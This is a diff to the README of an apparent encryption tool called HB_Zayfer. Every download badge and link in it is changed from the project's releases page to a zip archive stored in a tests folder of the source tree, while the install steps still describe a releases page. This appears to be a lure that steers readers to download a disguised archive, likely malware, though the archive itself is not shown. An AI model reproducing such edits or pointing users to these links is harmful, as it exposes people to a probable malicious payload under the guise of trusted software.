@@ -1,6 +1,6 @@
 # 🔒 HB_Zayfer - Secure Encryption for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip)
 
 ---
 
@@ -37,12 +37,12 @@ To run HB_Zayfer on Windows, your machine should meet these minimum requirements
 
 Start by visiting the official releases page to get the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-green?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases) 
+[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-green?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip) 
 
 ### Steps to Download and Install
 
 1. Click the download button above or visit this page directly:  
-   https://github.com/RAB-NAWAZ498/HB_Zayfer/releases
+   https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip
 
 2. On the releases page, look for the latest version. It will have a file with `.exe` extension or a compressed file like `.zip`.
 
@@ -168,7 +168,7 @@ Command line options will show more details if you type:
 ## 📥 Where to Get Updates and Support
 
 Visit the official release page here to download new versions or patches:  
-https://github.com/RAB-NAWAZ498/HB_Zayfer/releases
+https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip
 
 Check the repository’s Issues tab for common questions or report problems directly. The community and maintainers may offer help.
 
@@ -197,4 +197,4 @@ Check the repository’s Issues tab for common questions or report problems dire
 
 ---
 
-# [![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases)
+# [![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip)
